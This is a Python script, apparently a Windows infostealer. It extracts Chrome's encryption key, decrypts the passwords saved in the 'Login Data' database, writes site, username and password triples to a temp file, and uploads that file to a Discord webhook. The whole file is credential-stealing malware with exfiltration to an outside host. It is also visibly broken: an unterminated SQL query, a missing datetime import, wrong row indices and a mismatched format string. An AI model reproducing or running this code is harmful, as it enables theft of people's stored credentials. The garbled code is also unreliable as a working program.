import os
if os.name != "nt":
    exit()
import json,base64,sqlite3,time,win32crypt,shutil
from colorama import Fore
from Crypto.Cipher import AES
from discord_webhook import DiscordWebhook, DiscordEmbed

WEBHOOK = "https://discord.com/api/webhooks/..."

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def report_to_webhook():
        username = os.getlogin()
        time = datetime.now().strftime('%d/%m/%Y %H:%M')
        webhook = DiscordWebhook(url=WEBHOOK)
        path = os.environ["temp"] + "\\data.txt"
        with open(path, 'rb') as f:
            webhook.add_file(file=f.read(), filename='data.txt')
            embed = DiscordEmbed(title=f"Chrome Report From: ({username}) Time: {time}")
            webhook.add_embed(embed)    
            webhook.execute()
        try:
            os.remove(path) 
        except:
            pass

def main():
    os.system('cls')
    path = os.environ["temp"] + "\\data.txt" 
    f = open(path, 'a+') 
    key = get_encryption_key() 
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")  
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename) 
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, username_value, password_value)
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[2]
        password = decrypt_password(row[3], key)                
        f.write("--------------------------------------------------\n \nWebsite: %s \nUsername: %s \nPassword: %s \nAction URL: %s \n \n" % (origin_url, username, password))
        cursor.close()
        db.close()
        f.close()
        report_to_webhook()

if __name__ == "__main__":
	main()
